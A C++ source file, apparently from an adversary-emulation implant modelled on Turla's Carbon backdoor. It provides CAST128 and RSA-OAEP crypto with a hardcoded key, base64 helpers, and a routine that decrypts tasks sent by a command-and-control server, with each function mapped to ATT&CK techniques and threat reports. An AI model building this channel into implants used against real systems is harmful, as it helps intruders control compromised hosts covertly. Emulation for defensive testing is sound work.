#include <windows.h>
#include <string>

#include <exception>
#include <assert.h>
#include <iomanip>

#include "EncUtils.hpp"
#include "Logging.hpp"

namespace cast128_enc {

CryptoPP::AutoSeededRandomPool prng;

// hardcoded key hex f2d4560891bd948692c28d2a9391e7d9
std::vector<unsigned char> kCast128Key = {
    (unsigned char)0xf2, (unsigned char)0xd4, (unsigned char)0x56, (unsigned char)0x08, 
    (unsigned char)0x91, (unsigned char)0xbd, (unsigned char)0x94, (unsigned char)0x86, 
    (unsigned char)0x92, (unsigned char)0xc2, (unsigned char)0x8d, (unsigned char)0x2a, 
    (unsigned char)0x93, (unsigned char)0x91, (unsigned char)0xe7, (unsigned char)0xd9
};

// Reference: https://cryptopp.com/wiki/Initialization_Vector
std::vector<CryptoPP::byte> GenerateIv(size_t size) {
    // Generate IV
    std::vector<CryptoPP::byte> iv = std::vector<CryptoPP::byte>(size);
    prng.GenerateBlock(&iv[0], size);
    return iv;
}

/*
 * Cast128Encrypt:
 *      About:
 *          CAST128 encrypt the given plaintext using the given key.
 *      Result:
 *          Returns char vector of the resulting ciphertext, with the initialization vector prepended.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 *      Other References:
 *          https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<char> Cast128Encrypt(std::vector<char> plaintext, std::vector<unsigned char> key) {
    size_t key_size = key.size();
    
    // Verify provided key size
    if (key_size != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. Note that IV and block size are both 8 bytes.
    CryptoPP::byte key_bytes[CryptoPP::CAST128::DEFAULT_KEYLENGTH];
    CryptoPP::byte iv_bytes[CryptoPP::CAST128::BLOCKSIZE];

    std::vector<CryptoPP::byte> iv = GenerateIv(CryptoPP::CAST128::BLOCKSIZE);
    
    std::memcpy(key_bytes, &key[0], CryptoPP::CAST128::DEFAULT_KEYLENGTH);
    std::memcpy(iv_bytes, &iv[0], CryptoPP::CAST128::BLOCKSIZE);

    // Buffer for ciphertext
    std::string ciphertext;
    ciphertext.reserve((CryptoPP::CAST128::BLOCKSIZE * 2) + plaintext.size());

    // Encrypt
    CryptoPP::CBC_Mode<CryptoPP::CAST128>::Encryption cast_encryptor(key_bytes, sizeof(key_bytes), iv_bytes);
    CryptoPP::StringSource(std::string(plaintext.begin(), plaintext.end()), true,
        new CryptoPP::StreamTransformationFilter(cast_encryptor,
            new CryptoPP::StringSink(ciphertext)
        )
    );

    // Prepend IV to ciphertext
    size_t combined_size = CryptoPP::CAST128::BLOCKSIZE + ciphertext.length();
    std::vector<char> iv_and_ciphertext = std::vector<char>(combined_size);
    for (int i = 0; i < CryptoPP::CAST128::BLOCKSIZE; i++) {
        iv_and_ciphertext[i] = (char)iv_bytes[i];
    }
    iv_and_ciphertext.insert(iv_and_ciphertext.begin() + CryptoPP::CAST128::BLOCKSIZE, ciphertext.begin(), ciphertext.end());
    iv_and_ciphertext.resize(combined_size);
    return iv_and_ciphertext;
}

/*
 * Cast128Decrypt:
 *      About:
 *          CAST128 decrypt the given ciphertext using the given key.
 *      Result:
 *          Returns char vector of the resulting plaintext
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 *      Other References:
 *          https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<char> Cast128Decrypt(std::vector<char> ciphertext, std::vector<unsigned char> key) {
    size_t key_size = key.size();
    
    // Verify provided key size
    if (key_size != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. Note that IV and block size are both 8 bytes. First block of ciphertext is IV
    CryptoPP::byte key_bytes[CryptoPP::CAST128::DEFAULT_KEYLENGTH];
    CryptoPP::byte iv_bytes[CryptoPP::CAST128::BLOCKSIZE];
    std::memcpy(key_bytes, &key[0], CryptoPP::CAST128::DEFAULT_KEYLENGTH);
    std::memcpy(iv_bytes, &ciphertext[0], CryptoPP::CAST128::BLOCKSIZE);

    // Buffer for plaintext
    std::string plaintext;
    plaintext.reserve(ciphertext.size());

    // Decrypt
    CryptoPP::CBC_Mode<CryptoPP::CAST128>::Decryption cast_decryptor(key_bytes, sizeof(key_bytes), iv_bytes);
    CryptoPP::StringSource(std::string(ciphertext.begin() + CryptoPP::CAST128::BLOCKSIZE, ciphertext.end()), true,
        new CryptoPP::StreamTransformationFilter(cast_decryptor,
            new CryptoPP::StringSink(plaintext)
        )
    );
    return std::vector<char>(plaintext.begin(), plaintext.end());
}

} // namespace

namespace rsa_enc {

std::string rsa_private_key_base64("");

/*
 * RsaOaepSha1DecryptWithBase64Key:
 *      About:
 *          Decrypts the RSA ciphertext using the provided base64-encoded RSA private key. Uses OAEP padding and SHA1 hashing.
 *      Result:
 *          Returns char vector of the resulting plaintext
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 *      Other References:
 *          https://www.cryptopp.com/wiki/Keys_and_Formats#Loading_Keys
 *          https://www.cryptopp.com/wiki/RSA_Cryptography#Sample_Programs
 */
std::vector<unsigned char> RsaOaepSha1DecryptWithBase64Key(WinApiWrapperInterface* api_wrapper, std::vector<char> v_ciphertext, std::string base64_key) {
    CryptoPP::AutoSeededRandomPool rsa_prng;
    CryptoPP::RSA::PrivateKey private_key;
    std::string plaintext;

    try {
        // Get the RSA key from base64 string
        CryptoPP::ByteQueue queue;
        CryptoPP::Base64Decoder decoder;
        decoder.Attach(new CryptoPP::Redirector(queue));
        decoder.Put((const CryptoPP::byte*)base64_key.data(), base64_key.length());
        decoder.MessageEnd();

        private_key.BERDecodePrivateKey(queue, false, queue.MaxRetrievable());
        assert(queue.IsEmpty());

        if (!private_key.Validate(rsa_prng, 3)) {
            logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Invalid RSA key provided.");
            return std::vector<unsigned char>();
        }

        // Decrypt ciphertext
        std::string ciphertext = std::string(v_ciphertext.begin(), v_ciphertext.end());
        CryptoPP::RSAES_OAEP_SHA_Decryptor rsa_decryptor(private_key);
        CryptoPP::StringSource plaintext_ss(ciphertext, true,
            new CryptoPP::PK_DecryptorFilter(rsa_prng, rsa_decryptor,
                new CryptoPP::StringSink(plaintext)
            )
        );
    } catch( CryptoPP::Exception& e ) {
        logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Caught exception during RSA decryption: " + std::string(e.what()));
        return std::vector<unsigned char>();
    }
    return std::vector<unsigned char>(plaintext.begin(), plaintext.end());
}

} // namespace

class FailClass {
    FailClass (std::string){};
};


/*
 * decodeValue:
 *      About:
 *          Base64 decode data
 *      Result:
 *          Returns shared byte array pointer and length for the decoded plaintext.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      Other References:
 *          https://www.cryptopp.com/wiki/Base64Decoder
 */
std::pair<std::shared_ptr<byte[]>, unsigned long long> decodeValue(std::string encoded){

    std::shared_ptr<byte[]> decoded;
    if (encoded.length() == 0){
        return std::make_pair(decoded, 0);
    }

    // TODO trim invalid values?
    
    CryptoPP::Base64Decoder decoder;
    decoder.Put( (byte*)encoded.data(), encoded.size() );
    decoder.MessageEnd();

    CryptoPP::word64 size = decoder.MaxRetrievable();
    if(size && size <= SIZE_MAX)
    {
        decoded = std::make_shared<byte[]>(size);	
        decoder.Get(decoded.get(), size);
    }

    return std::make_pair(decoded, size);
}

/*
 * decodeToString:
 *      About:
 *          Base64 decode data into a std::string
 *      Result:
 *          Returns std::string containing plaintext
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      Other References:
 *          https://www.cryptopp.com/wiki/Base64Decoder
 */
std::string decodeToString(std::string encoded){
    auto [decodedBytes, decodedBytesSize] = decodeValue(encoded);
    return std::string{(char*)decodedBytes.get(), (unsigned int) decodedBytesSize};
}

/*
 * encodeData:
 *      About:
 *          Base64 encode data
 *      Result:
 *          Returns base64-encoded string
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      Other References:
 *          https://www.cryptopp.com/wiki/Base64Encoder
 */
std::string encodeData(byte* inputData, size_t dataSize){
    std::string encoded;

    CryptoPP::Base64Encoder encoder(NULL, FALSE, 0);
    encoder.Put(inputData, dataSize);
    encoder.MessageEnd();

    CryptoPP::word64 size = encoder.MaxRetrievable();
    if(size)
    {
        encoded.resize(size);		
        encoder.Get((byte*)&encoded[0], encoded.size());
    }

    return encoded;
}

/*
 * encodeData:
 *      About:
 *          Base64 encode data
 *      Result:
 *          Returns base64-encoded string
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      Other References:
 *          https://www.cryptopp.com/wiki/Base64Encoder
 */
std::string encodeData(std::string inputData){
    return encodeData((byte*)inputData.data(), inputData.size());
}

/*
 * DecryptServerTaskResp:
 *      About:
 *          Decrypt the RSA and CAST128-encrypted server response to obtain underlying task information. 
 *          First block of data contains the RSA-encrypted CAST128 key, which is then used to decrypt
 *          the rest of the data.
 *      Result:
 *          Returns decrypted task data and data length
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1573.002: Encrypted Channel: Asymmetric Cryptography
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
std::pair<std::shared_ptr<byte[]>, size_t> DecryptServerTaskResp(WinApiWrapperInterface* api_wrapper, std::shared_ptr<byte[]> encrypted_blob, size_t encrypted_blob_len) {
    auto min_size = RSA_CIPHERTEXT_LENGTH + CryptoPP::CAST128::BLOCKSIZE + CryptoPP::CAST128::BLOCKSIZE;
    if ((int)encrypted_blob_len < min_size) {
        logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Ciphertext too short. Expecting at least " + std::to_string(min_size) + " bytes for combined ciphertext");
        return std::make_pair(nullptr, 0);
    }
    
    // RSA encrypted blob contains base64-encoded cast128 key
    std::vector<char> rsa_ciphertext(encrypted_blob.get(), encrypted_blob.get() + RSA_CIPHERTEXT_LENGTH);
    std::vector<unsigned char> encoded_cast128_key = rsa_enc::RsaOaepSha1DecryptWithBase64Key(api_wrapper, rsa_ciphertext, rsa_enc::rsa_private_key_base64);
    std::string encoded_key_str(encoded_cast128_key.begin(), encoded_cast128_key.end());
    std::string decoded_key;
    try {
        CryptoPP::StringSource ss(encoded_key_str, true, new CryptoPP::Base64Decoder(new CryptoPP::StringSink(decoded_key)));
    } catch (...) {
        logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Failed to base64 decode key: " + encoded_key_str);
        return std::make_pair(nullptr, 0);
    }
    if (decoded_key.length() == 0) {
        logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Failed to base64 decode key: " + encoded_key_str);
        return std::make_pair(nullptr, 0);
    }
    std::vector<unsigned char> cast128_key(decoded_key.begin(), decoded_key.end());
    if (cast128_key.size() != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        logging::LogMessage(api_wrapper, LOG_ENCRYPTION, LOG_LEVEL_ERROR, "Invalid decrypted cast 128 key size " + std::to_string(cast128_key.size()));
        return std::make_pair(nullptr, 0);
    }
    
    // Remaining blob contains IV + ciphertext
    std::vector<char> cast_ciphertext(encrypted_blob.get() + RSA_CIPHERTEXT_LENGTH, encrypted_blob.get() + encrypted_blob_len);
    std::vector<char> decrypted_task_data = cast128_enc::Cast128Decrypt(cast_ciphertext, cast128_key);
    auto task_data_size = decrypted_task_data.size();
    std::shared_ptr<byte[]> task_data = std::make_shared<byte[]>(task_data_size);
    for (size_t i = 0; i < task_data_size; i++) {
        task_data[i] = (byte)decrypted_task_data[i];
    }
    return std::make_pair(task_data, task_data_size);
}